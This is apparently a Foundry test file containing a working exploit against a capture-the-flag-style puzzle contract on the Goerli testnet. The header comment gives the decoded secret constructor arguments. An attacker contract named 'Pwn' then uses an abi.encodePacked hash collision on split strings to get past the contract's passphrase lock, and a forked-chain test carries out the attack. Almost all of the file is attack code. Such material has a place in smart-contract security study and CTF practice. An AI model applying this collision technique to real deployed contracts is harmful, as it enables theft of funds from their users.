// -----Decoded View---------------
// Arg [0] : molochPass (string): BLOODY PHARMACIST
// Arg [1] : _b (string[2]): WHO DO YOU,SERVE?
// Arg [2] : a (address[3]): 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4,0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db
// Arg [3] : _passss (string[3]): KCLEQ,BGTGJQNGP,ZJQQBW*NFCPKCAKQR

// SPDX-License-Identifier: UNLICENSED
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
pragma solidity ^0.8.13;

interface Ip {
    function uhER778(string[3] memory _openSecrete) external payable;
}

contract Pwn {
    Ip immutable ip;
    address payable immutable me;
    address payable ipaddress =
        payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f);

    constructor() {
        ip = Ip(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f); // Interface puzzle
        me = payable(msg.sender);
    }

    function pwn() external {
        string[3] memory locks;
        //Hash collision
        locks = ["BLOODY PHARMACIST", "WHO DO YO", "USERVE?"];
        ip.uhER778(locks);
    }

    receive() external payable {
        (bool sucess, ) = ipaddress.call{value: 2 wei}("");
        require(sucess, "XD");
    }
}

contract MOCHO_Vault is Test {
    address internal attacker;
    address internal ipaddr = 0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f;
    Ip internal ip;
    Pwn internal pwn;

    function setUp() public {
        vm.createSelectFork("goreli", 8652081);
        attacker = makeAddr("Attacker");
        vm.label(ipaddr, "PUzzle");
        vm.deal(attacker, 10 wei);
    }

    // function testRead() public view {
    //     for (uint256 i; i < 5; i++) {
    //         bytes32 stVal = vm.load(
    //             0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f,
    //             bytes32(i)
    //         );
    //         console.logBytes32(stVal);
    //     }
    // }

    function testPwn() external {
        vm.startPrank(attacker);
        pwn = new Pwn();
        vm.label(address(pwn), "AttackerContract");
        (bool sucess, ) = address(pwn).call{value: 5 wei}("");
        require(sucess, "failed send 5 wei");
        pwn.pwn();
        vm.stopPrank();
    }
}
